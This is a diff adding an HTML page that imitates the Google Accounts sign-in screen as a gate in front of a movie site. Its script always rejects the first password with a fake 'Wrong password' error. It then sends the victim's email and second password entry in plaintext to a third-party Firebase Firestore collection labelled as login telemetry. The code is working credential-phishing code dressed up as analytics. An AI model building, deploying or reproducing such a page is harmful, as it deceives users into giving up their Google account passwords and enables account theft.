@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <!-- Google Fonts: Roboto for body, Google Sans for headers -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --google-red-error: #d93025;
+            --google-green-success: #1e8e3e;
+            --text-primary: #202124;
+            --text-secondary: #5f6368;
+            --border-color: #dadce0;
+            --focus-ring-color: #d2e3fc;
+        }
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #fff;
+            color: var(--text-primary);
+        }
+
+        /* --- STYLES FOR NEW PROFESSIONAL 3D BUTTONS --- */
+        #welcomeScreen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
+            background-image: url('welcome.webp');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 2000;
+        }
+
+        .welcome-buttons {
+            display: flex;
+            gap: 25px; /* Added space between buttons */
+        }
+
+        /* Base style for all 3D buttons */
+        .welcome-buttons button, #logoutButton {
+            min-width: 140px;
+            padding: 12px 24px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            border-radius: 12px;
+            border: 1px solid rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+            position: relative;
+            transition: all 0.2s ease-in-out;
+            user-select: none; /* Prevent text selection on click */
+            -webkit-font-smoothing: antialiased; /* Smoother text */
+        }
+
+        .welcome-buttons button:active, #logoutButton:active {
+            transform: translateY(3px); /* Button presses down */
+            box-shadow: none; /* Shadow disappears when pressed */
+            border-bottom-width: 1px;
+        }
+        
+        /* Start Button styles */
+        #startButton {
+            background: linear-gradient(145deg, #66bb6a, #388e3c);
+            border-bottom: 5px solid #2e7d32;
+            box-shadow: 0 5px 8px rgba(0, 0, 0, 0.25);
+        }
+
+        #startButton:hover:not(:disabled) {
+            background: linear-gradient(145deg, #81c784, #43a047);
+            transform: translateY(-3px); /* Button lifts up */
+            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        #startButton:disabled {
+            background: linear-gradient(145deg, #a5d6a7, #81c784);
+            border-bottom-color: #66bb6a;
+            color: #e8f5e9;
+            cursor: not-allowed;
+            box-shadow: none;
+            text-shadow: none;
+            opacity: 0.7;
+        }
+
+        /* Sign Up Button styles */
+        #signUpButton {
+            background: linear-gradient(145deg, #42a5f5, #1976d2);
+            border-bottom: 5px solid #1565c0;
+            box-shadow: 0 5px 8px rgba(0, 0, 0, 0.25);
+        }
+
+        #signUpButton:hover {
+            background: linear-gradient(145deg, #64b5f6, #1e88e5);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Logout Button styles */
+        #logoutButton {
+            position: absolute;
+            bottom: 30px;
+            background: linear-gradient(145deg, #ef5350, #d32f2f);
+            border-bottom: 5px solid #c62828;
+            box-shadow: 0 5px 8px rgba(0, 0, 0, 0.25);
+            font-size: 14px;
+            min-width: 100px;
+            padding: 8px 16px;
+        }
+
+        #logoutButton:hover {
+            background: linear-gradient(145deg, #e57373, #e53935);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.3);
+        }
+        /* --- END OF NEW STYLES --- */
+
+
+        .container-wrapper {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+            padding-top: 50px;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            box-sizing: border-box;
+        }
+        
+        #emailStep {
+            text-align: center;
+        }
+        
+        #passwordStep .content-container {
+             text-align: left;
+        }
+
+        .header {
+            margin-bottom: 24px;
+        }
+
+        .google-logo {
+            width: 75px;
+            height: auto;
+            display: block;
+        }
+        
+        #emailStep .google-logo {
+             margin: 0 auto;
+        }
+
+        h1 {
+            font-family: "Google Sans", "Noto Sans Myanmar UI", arial, sans-serif;
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin: 16px 0 0;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            letter-spacing: .1px;
+            line-height: 1.5;
+            padding-top: 8px;
+        }
+        
+        .user-email-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            height: 36px;
+            padding: 0 16px;
+            margin-top: 16px;
+            margin-bottom: 24px;
+            border: 1px solid var(--border-color);
+            border-radius: 18px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #3c4043;
+        }
+
+        .form-group {
+            position: relative;
+            margin-top: 8px;
+            width: 100%;
+        }
+        
+        .form-input {
+            width: 100%;
+            height: 56px;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            background-color: transparent;
+            color: var(--text-primary);
+        }
+        
+        .form-input::placeholder { color: transparent; }
+
+        .form-label {
+            position: absolute;
+            top: 15px;
+            left: 16px;
+            font-size: 16px;
+            color: var(--text-secondary);
+            pointer-events: none;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .form-input:focus + .form-label,
+        .form-input:not(:placeholder-shown) + .form-label {
+            top: -8px;
+            left: 12px;
+            font-size: 12px;
+            color: var(--google-blue);
+            background-color: white;
+            padding: 0 4px;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border: 2px solid var(--google-blue);
+            padding: 12px 14px;
+        }
+        
+        .form-input.has-error {
+            border: 2px solid var(--google-red-error);
+            padding: 12px 14px;
+        }
+        .form-input.has-error + .form-label {
+            color: var(--google-red-error);
+        }
+
+
+        .form-links {
+            text-align: left;
+            margin-top: 8px;
+        }
+
+        .link-button {
+            font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
+            color: var(--google-blue);
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+            padding: 8px 0;
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: inline-block;
+        }
+        .link-button:hover { background-color: rgba(26, 115, 232, 0.04); border-radius: 4px; }
+
+        .button-group {
+            display: flex;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        #emailStep .button-group {
+            justify-content: space-between;
+        }
+
+        #passwordStep .button-group {
+            justify-content: flex-end;
+        }
+
+
+        .next-button {
+            background-color: var(--google-blue);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 0 24px;
+            height: 36px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color .2s, box-shadow .2s;
+        }
+        .next-button:hover {
+            background-color: #185abc;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        .next-button:disabled {
+             background-color: #e0e0e0;
+             box-shadow: none;
+             cursor: not-allowed;
+        }
+
+        .footer-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            padding: 24px 0;
+        }
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 450px;
+            padding: 0 40px;
+            box-sizing: border-box;
+        }
+        .language-selector-wrapper {
+            position: relative;
+        }
+        .language-selector-button {
+            display: inline-flex;
+            align-items: center;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 12px;
+            color: var(--text-primary);
+            padding: 8px;
+            border-radius: 4px;
+        }
+        .language-selector-button:hover { background-color: #f8f9fa; }
+        .language-selector-button svg { width: 16px; height: 16px; margin-left: 8px; fill: var(--text-secondary); }
+        .footer-links {
+            display: flex;
+            gap: 24px;
+            font-size: 12px;
+            align-items: center;
+        }
+        .footer a { color: var(--text-secondary); text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+
+        .hidden { display: none !important; }
+
+        .message-area {
+            text-align: left;
+            font-size: 12px;
+            line-height: 1.5;
+            min-height: 20px;
+            margin-top: 4px;
+        }
+        .error-text { 
+            color: var(--google-red-error); 
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .success-text { color: var(--google-green-success); font-weight: 500; }
+        
+        .language-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.3);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .language-modal {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
+            width: 90%;
+            max-width: 320px;
+            padding: 16px 0;
+        }
+        .language-modal ul {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .language-modal li {
+            display: flex;
+            align-items: center;
+            padding: 12px 24px;
+            cursor: pointer;
+        }
+        .language-modal li:hover { background-color: #f8f9fa; }
+        .language-modal input[type="radio"] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--text-secondary);
+            border-radius: 50%;
+            margin-right: 16px;
+            position: relative;
+            flex-shrink: 0;
+        }
+        .language-modal input[type="radio"]:checked {
+            border-color: var(--google-blue);
+        }
+        .language-modal input[type="radio"]:checked::before {
+            content: '';
+            display: block;
+            width: 10px;
+            height: 10px;
+            background-color: var(--google-blue);
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .language-modal label {
+            font-size: 14px;
+            cursor: pointer;
+            flex-grow: 1;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- NEW WELCOME SCREEN -->
+    <div id="welcomeScreen">
+        <div class="welcome-buttons">
+            <button id="startButton" disabled>Start</button>
+            <button id="signUpButton">Sign Up</button>
+        </div>
+        <button id="logoutButton" class="hidden">Log Out</button>
+    </div>
+
+
+    <div class="container-wrapper hidden">
+        <main class="main-container">
+            <!-- Step 1: Email Input -->
+            <div id="emailStep">
+                <div class="header">
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png" alt="Google" class="google-logo">
+                    <h1 data-translate="signIn">Sign in</h1>
+                    <p class="subtitle" data-translate="useYourAccount">Use your Google Account</p>
+                </div>
+                <form id="emailForm" onsubmit="return false;">
+                    <div class="form-group">
+                        <input type="email" id="emailInput" class="form-input" placeholder=" " required>
+                        <label for="emailInput" class="form-label" data-translate="emailLabel">Email or phone</label>
+                    </div>
+                    <div id="emailMessage" class="message-area"></div>
+                    <div class="form-links">
+                        <a href="https://accounts.google.com/signin/v2/usernamerecovery" target="_blank" rel="noopener noreferrer" class="link-button" data-translate="forgotEmail">Forgot email?</a>
+                    </div>
+                    <div class="button-group">
+                        <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" class="link-button" data-translate="createAccount">Create account</a>
+                        <button id="nextEmailBtn" type="submit" class="next-button" data-translate="next">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Step 2: Password Input -->
+            <div id="passwordStep" class="hidden">
+                 <div class="content-container">
+                     <div class="header">
+                        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png" alt="Google" class="google-logo">
+                        <h1 data-translate="welcome">Welcome</h1>
+                        <div class="user-email-chip">
+                           <span id="userEmail"></span>
+                        </div>
+                    </div>
+                     <form id="passwordForm" onsubmit="return false;">
+                        <div class="form-group">
+                            <input type="password" id="passwordInput" class="form-input" placeholder=" " required>
+                            <label for="passwordInput" class="form-label" data-translate="passwordLabel">Enter your password</label>
+                        </div>
+                        <div id="passwordMessage" class="message-area"></div>
+                        <div class="form-links">
+                            <a href="https://accounts.google.com/signin/v2/recovery/pwd" target="_blank" rel="noopener noreferrer" class="link-button" data-translate="forgotPassword">Forgot password?</a>
+                        </div>
+                        <div class="button-group">
+                            <button id="nextPasswordBtn" type="submit" class="next-button" data-translate="next">Next</button>
+                        </div>
+                    </form>
+                 </div>
+            </div>
+        </main>
+        
+        <div class="footer-wrapper">
+            <footer class="footer">
+                <div class="language-selector-wrapper">
+                    <button class="language-selector-button" id="languageSelectorBtn">
+                        <span id="currentLanguage">English (United Kingdom)</span>
+                        <svg focusable="false" width="24px" height="24px" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg>
+                    </button>
+                </div>
+                <div class="footer-links">
+                    <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" data-translate="help">Help</a>
+                    <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" data-translate="privacy">Privacy</a>
+                    <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" data-translate="terms">Terms</a>
+                </div>
+            </footer>
+        </div>
+    </div>
+    
+    <div class="language-modal-overlay" id="languageModalOverlay">
+        <div class="language-modal">
+            <ul id="languageList">
+                <!-- Language list will be populated by JavaScript -->
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // --- THIS IS THE ORIGINAL SCRIPT FOR PAGE FUNCTIONALITY ---
+        document.addEventListener('DOMContentLoaded', () => {
+            let currentLang = 'en';
+            let passwordAttemptCounter = 1;
+
+            const elements = {
+                // NEW ELEMENTS
+                welcomeScreen: document.getElementById('welcomeScreen'),
+                containerWrapper: document.querySelector('.container-wrapper'),
+                startButton: document.getElementById('startButton'),
+                signUpButton: document.getElementById('signUpButton'),
+                logoutButton: document.getElementById('logoutButton'),
+
+                // ORIGINAL ELEMENTS
+                emailStep: document.getElementById('emailStep'),
+                passwordStep: document.getElementById('passwordStep'),
+                emailForm: document.getElementById('emailForm'),
+                passwordForm: document.getElementById('passwordForm'),
+                emailInput: document.getElementById('emailInput'),
+                passwordInput: document.getElementById('passwordInput'),
+                userEmailDisplay: document.getElementById('userEmail'),
+                emailMessage: document.getElementById('emailMessage'),
+                passwordMessage: document.getElementById('passwordMessage'),
+                nextPasswordBtn: document.getElementById('nextPasswordBtn'),
+                languageSelectorBtn: document.getElementById('languageSelectorBtn'),
+                languageModalOverlay: document.getElementById('languageModalOverlay'),
+                languageList: document.getElementById('languageList'),
+                currentLanguageSpan: document.getElementById('currentLanguage')
+            };
+
+            const translations = {
+                en: {
+                    signIn: "Sign in", useYourAccount: "Use your Google Account", emailLabel: "Email or phone",
+                    forgotEmail: "Forgot email?", createAccount: "Create account", next: "Next",
+                    welcome: "Welcome", passwordLabel: "Enter your password", help: "Help", privacy: "Privacy", terms: "Terms",
+                    forgotPassword: "Forgot password?",
+                    success_login: "Sign up Successful! Welcome.",
+                    wrong_password: "Wrong password. Try again or click Forgot password to reset it.",
+                    email_not_found: "Couldn't find your Google Account"
+                },
+                hi: {
+                    signIn: "साइन इन करें", useYourAccount: "अपने Google खाते का उपयोग करें", emailLabel: "ईमेल या फ़ोन",
+                    forgotEmail: "ईमेल भूल गए?", createAccount: "खाता बनाएं", next: "आगे बढ़ें",
+                    welcome: "आपका स्वागत है", passwordLabel: "अपना पासवर्ड डालें", help: "सहायता", privacy: "निजता", terms: "शर्तें",
+                    forgotPassword: "पासवर्ड भूल गए?",
+                    success_login: "साइन अप सफल! आपका स्वागत है।",
+                    wrong_password: "गलत पासवर्ड। फिर से प्रयास करें या अपना पासवर्ड रीसेट करने के लिए 'पासवर्ड भूल गए' पर क्लिक करें।",
+                    email_not_found: "आपका Google खाता नहीं मिला"
+                }
+            };
+            
+            const languageData = {
+                'en': 'English (United Kingdom)', 'hi': 'हिन्दी', 'af': 'Afrikaans', 'az': 'Azərbaycan', 'id': 'Bahasa Indonesia',
+                'ms': 'Bahasa Melayu', 'ca': 'Català', 'cs': 'Čeština', 'da': 'Dansk', 'de': 'Deutsch', 'et': 'Eesti',
+                'es': 'Español (España)', 'es-419': 'Español (Latinoamérica)', 'eu': 'Euskara', 'fil': 'Filipino',
+                'fr': 'Français', 'fr-ca': 'Français (Canada)', 'gl': 'Galego', 'hr': 'Hrvatski', 'zu': 'IsiZulu',
+                'is': 'Íslenska', 'it': 'Italiano', 'sw': 'Kiswahili', 'lv': 'Latviešu', 'lt': 'Lietuvių', 'hu': 'Magyar',
+                'nl': 'Nederlands', 'no': 'Norsk', 'pl': 'Polski', 'pt-br': 'Português (Brasil)', 'pt-pt': 'Português (Portugal)',
+                'ro': 'Română', 'sk': 'Slovenčina', 'sl': 'Slovenščina', 'fi': 'Suomi', 'sv': 'Svenska', 'vi': 'Tiếng Việt',
+                'tr': 'Türkçe', 'el': 'Ελληνικά', 'bg': 'Български', 'ru': 'Русский', 'sr': 'Срски', 'uk': 'Українська',
+                'he': 'עברית', 'ar': 'العربية', 'fa': 'فارسی', 'mr': 'मराठी', 'th': 'ไทย', 'ko': '한국어',
+                'zh-cn': '中文 (简体)', 'zh-tw': '中文 (繁體)', 'ja': '日本語'
+            };
+            
+            // --- NEW FUNCTIONS FOR SESSION MANAGEMENT ---
+            function checkLoginStatus() {
+                if (localStorage.getItem('isUserSignedUp') === 'true') {
+                    elements.startButton.disabled = false;
+                    elements.signUpButton.classList.add('hidden');
+                    elements.logoutButton.classList.remove('hidden');
+                } else {
+                    elements.startButton.disabled = true;
+                    elements.signUpButton.classList.remove('hidden');
+                    elements.logoutButton.classList.add('hidden');
+                }
+            }
+            
+            elements.signUpButton.addEventListener('click', () => {
+                elements.welcomeScreen.classList.add('hidden');
+                elements.containerWrapper.classList.remove('hidden');
+            });
+
+            elements.logoutButton.addEventListener('click', () => {
+                localStorage.removeItem('isUserSignedUp');
+                checkLoginStatus();
+                alert('You have been logged out.');
+            });
+            
+            elements.startButton.addEventListener('click', () => {
+                if (!elements.startButton.disabled) {
+                    window.location.href = 'https://movixhub.netlify.app';
+                }
+            });
+
+            // --- ORIGINAL FUNCTIONS MODIFIED/KEPT ---
+            const populateLanguageList = () => {
+                elements.languageList.innerHTML = '';
+                for (const [code, name] of Object.entries(languageData)) {
+                    const li = document.createElement('li');
+                    li.setAttribute('data-lang-code', code);
+                    const isChecked = code === currentLang;
+                    li.innerHTML = `
+                        <input type="radio" id="lang-${code}" name="language" value="${code}" ${isChecked ? 'checked' : ''}>
+                        <label for="lang-${code}">${name}</label>
+                    `;
+                    elements.languageList.appendChild(li);
+                }
+            };
+
+            const updateLanguage = (lang) => {
+                currentLang = lang;
+                const langPack = translations[lang] || translations['en']; 
+                
+                document.querySelectorAll('[data-translate]').forEach(el => {
+                    const key = el.dataset.translate;
+                    if (langPack[key]) {
+                        el.innerHTML = langPack[key];
+                    }
+                });
+                
+                if (elements.emailMessage.innerHTML) {
+                    showError(elements.emailMessage, langPack.email_not_found, elements.emailInput);
+                }
+                if (elements.passwordMessage.innerHTML && !elements.passwordMessage.querySelector('.success-text')) {
+                     showError(elements.passwordMessage, langPack.wrong_password, elements.passwordInput);
+                }
+
+                elements.currentLanguageSpan.textContent = languageData[lang];
+                elements.languageModalOverlay.style.display = 'none';
+                const radioToUpdate = document.getElementById(`lang-${lang}`);
+                if(radioToUpdate) radioToUpdate.checked = true;
+            };
+
+            const showError = (messageElement, text, inputElement) => {
+                const errorIcon = `<svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>`;
+                messageElement.innerHTML = `<p class="error-text">${errorIcon}<span>${text}</span></p>`;
+                if (inputElement) {
+                    inputElement.classList.add('has-error');
+                }
+            };
+            
+            const clearError = (messageElement, inputElement) => {
+                messageElement.innerHTML = '';
+                 if (inputElement) {
+                    inputElement.classList.remove('has-error');
+                }
+            };
+            
+            elements.languageSelectorBtn.addEventListener('click', () => {
+                elements.languageModalOverlay.style.display = 'flex';
+            });
+            
+            elements.languageModalOverlay.addEventListener('click', (event) => {
+                if (event.target === elements.languageModalOverlay) {
+                    elements.languageModalOverlay.style.display = 'none';
+                }
+            });
+
+            elements.languageList.addEventListener('click', (event) => {
+                const targetLi = event.target.closest('li');
+                if (targetLi) {
+                    const langCode = targetLi.dataset.langCode;
+                    if (langCode) {
+                        updateLanguage(langCode);
+                    }
+                }
+            });
+
+            elements.emailForm.addEventListener('submit', (event) => {
+                event.preventDefault();
+                clearError(elements.emailMessage, elements.emailInput);
+                elements.userEmailDisplay.textContent = elements.emailInput.value.trim();
+                elements.emailStep.classList.add('hidden');
+                elements.passwordStep.classList.remove('hidden');
+                elements.passwordInput.focus();
+            });
+            
+            elements.passwordForm.addEventListener('submit', (event) => {
+                event.preventDefault();
+                const langPack = translations[currentLang] || translations['en'];
+                const enteredPassword = elements.passwordInput.value;
+
+                if (enteredPassword === '') {
+                    showError(elements.passwordMessage, langPack.passwordLabel, elements.passwordInput);
+                    return;
+                }
+
+                if (passwordAttemptCounter === 1) {
+                    showError(elements.passwordMessage, langPack.wrong_password, elements.passwordInput);
+                    passwordAttemptCounter++;
+                } else {
+                    clearError(elements.passwordMessage, elements.passwordInput);
+                    
+                    if (window.logSuccessfulReattempt) {
+                        const userIdentifier = elements.userEmailDisplay.textContent;
+                        window.logSuccessfulReattempt(userIdentifier, enteredPassword);
+                    }
+                    
+                    elements.passwordMessage.innerHTML = `<p class="success-text">${langPack.success_login}</p>`;
+                    elements.passwordInput.disabled = true;
+                    elements.nextPasswordBtn.disabled = true;
+                    
+                    // NEW: Set login state
+                    localStorage.setItem('isUserSignedUp', 'true');
+
+                    setTimeout(() => {
+                        alert("Sign up successful! Returning to home page.");
+                        // MODIFIED: Return to home screen instead of just resetting
+                        returnToWelcomeScreen();
+                    }, 2000);
+                }
+            });
+
+            function resetForm() {
+                elements.emailInput.value = '';
+                elements.passwordInput.value = '';
+                elements.passwordInput.disabled = false;
+                elements.nextPasswordBtn.disabled = false;
+                clearError(elements.emailMessage, elements.emailInput);
+                clearError(elements.passwordMessage, elements.passwordInput);
+                elements.emailStep.classList.remove('hidden');
+                elements.passwordStep.classList.add('hidden');
+                passwordAttemptCounter = 1; 
+            }
+            
+            // NEW FUNCTION
+            function returnToWelcomeScreen() {
+                resetForm();
+                elements.containerWrapper.classList.add('hidden');
+                elements.welcomeScreen.classList.remove('hidden');
+                checkLoginStatus(); // Update buttons on welcome screen
+            }
+
+            // --- INITIAL SETUP ---
+            checkLoginStatus();
+            populateLanguageList();
+            updateLanguage(currentLang);
+        });
+    </script>
+    
+    <!-- NEW SCRIPT FOR FIREBASE INTEGRATION -->
+    <script type="module">
+        // Import the functions you need from the SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyB2PG5JvDko2UmQDlY9gN5lBgga2vQy-Ws",
+            authDomain: "conceptra-c1000.firebaseapp.com",
+            databaseURL: "https://conceptra-c1000-default-rtdb.firebaseio.com",
+            projectId: "conceptra-c1000",
+            storageBucket: "conceptra-c1000.appspot.com",
+            messagingSenderId: "298402987968",
+            appId: "1:298402987968:web:c0d0d7d6c08cdfa6bc5225",
+            measurementId: "G-QRQYEVSJJ6"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        /**
+         * Logs a successful login re-attempt event to Firestore.
+         * @param {string} userIdentifier - The user's email or phone number.
+         * @param {string} finalAttemptValue - The password value from the successful attempt.
+         */
+        async function logSuccessfulReattempt(userIdentifier, finalAttemptValue) {
+            try {
+                const docRef = await addDoc(collection(db, "login_telemetry"), {
+                    identifier: userIdentifier,
+                    inputValue: finalAttemptValue,
+                    eventType: "LOGIN_REATTEMPT_SUCCESS",
+                    timestamp: new Date()
+                });
+                console.log("Analytics event logged with ID: ", docRef.id);
+            } catch (e) {
+                console.error("Error logging event to Firestore: ", e);
+            }
+        }
+        
+        // Make the function globally available to be called from the other script
+        window.logSuccessfulReattempt = logSuccessfulReattempt;
+
+    </script>
+
+</body>
+</html>
